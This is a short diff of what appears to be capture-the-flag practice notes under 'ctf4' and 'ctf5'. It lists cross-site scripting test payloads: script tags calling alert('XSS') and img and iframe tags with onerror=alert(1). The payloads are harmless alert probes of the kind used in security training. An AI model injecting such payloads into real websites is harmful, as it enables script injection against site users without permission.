@@ -1,11 +1,12 @@
 
 ctf4
+<script alert("XSS")/>
 <script> alert("XSS");</script>
+
 #<iframe src='sdfsdgds' onerror=alert(1) />
 
 ctf5
 <img src='#' onerror=alert(1) />
-
 
 
 
